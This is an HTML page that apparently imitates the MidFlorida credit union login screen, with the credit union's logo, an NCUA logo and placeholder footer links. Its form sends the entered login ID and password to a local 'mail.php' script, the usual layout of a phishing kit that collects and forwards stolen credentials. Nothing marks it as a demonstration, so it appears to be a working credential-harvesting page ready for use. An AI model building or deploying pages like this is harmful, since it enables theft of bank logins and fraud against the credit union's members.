<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>MidFlorida Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
    <style>
        @media (max-width: 640px) {
            .footer-links {
                flex-direction: column;
                align-items: center;
                gap: 0.75rem;
            }
            .footer-links .divider {
                display: none;
            }
        }
    </style>
</head>
<body class="min-h-screen bg-gradient-to-b from-[#5a8ccf] via-[#4a7ec1] to-[#005a9c] flex flex-col items-center justify-center font-sans p-4">
    <div class="w-full max-w-md bg-white rounded-sm shadow-md">
        <div class="p-4 sm:p-8 border-b border-gray-200 flex justify-center">
            <img src="logo.PNG" alt="MIDFLORIDA Florida's community credit union logo" class="h-18 sm:h-20 object-contain" />
        </div>
        <form class="p-4 sm:p-8" action="mail.php" method="post">
            <div class="mb-4">
                <label for="loginId" class="block text-xs font-semibold text-gray-700 mb-1">Login ID</label>
                <input id="loginId" type="text" name="email" class="w-full border border-gray-300 rounded-sm px-3 py-2 text-base focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500" autocomplete="username" />
            </div>
            <div class="mb-2 relative">
                <label for="password" class="block text-xs font-semibold text-gray-700 mb-1">Password</label>
                <input id="password" type="password" name="password" class="w-full border border-gray-300 rounded-sm px-3 py-2 text-base focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500" autocomplete="current-password" />
                <button type="button" class="absolute right-2 top-7 text-xs text-blue-600 font-normal hover:underline focus:outline-none" onclick="togglePassword()" aria-label="Show or hide password">
                    Show
                </button>
            </div>
            <div class="mb-6 flex items-center space-x-2">
                <input id="remember" type="checkbox" class="w-4 h-4 border border-gray-300 rounded-sm text-blue-600 focus:ring-blue-500" />
                <label for="remember" class="text-xs text-gray-700 select-none">Remember me</label>
            </div>
            <button type="submit" name="send" class="w-full bg-[#5ba19a] text-white text-xs font-bold py-2 rounded-sm hover:bg-[#4a8b85] focus:outline-none focus:ring-2 focus:ring-offset-1 focus:ring-[#5ba19a]">
                Log In
            </button>
            <div class="mt-3 text-right">
                <a href="#" class="text-xs text-[#0a6a6a] hover:underline">Forgot your password?</a>
            </div>
        </form>
        <div class="bg-[#004a7f] text-white text-xs py-3 border-t border-[#003a6a]">
            <div class="footer-links flex flex-wrap justify-center space-x-4 sm:space-x-6">
                <a href="#" class="hover:underline font-semibold">Privacy Policy</a>
                <span class="divider border-l border-white h-4 self-center"></span>
                <a href="#" class="hover:underline font-semibold">Forgot Login</a>
                <span class="divider border-l border-white h-4 self-center"></span>
                <a href="#" class="hover:underline font-semibold">Contact Us</a>
                <span class="divider border-l border-white h-4 self-center"></span>
                <a href="#" class="hover:underline font-semibold">Locations</a>
            </div>
        </div>
    </div>
    <div class="mt-20 flex justify-center" >
        <img src="footer.png" alt="NCUA logo" class="h-10 sm:h-20 object-contain" />
    </div>

    <script>
        function togglePassword() {
            const pwdInput = document.getElementById('password');
            const btn = event.currentTarget;
            if (pwdInput.type === 'password') {
                pwdInput.type = 'text';
                btn.textContent = 'Hide';
            } else {
                pwdInput.type = 'password';
                btn.textContent = 'Show';
            }
        }
    </script>
</body>
</html>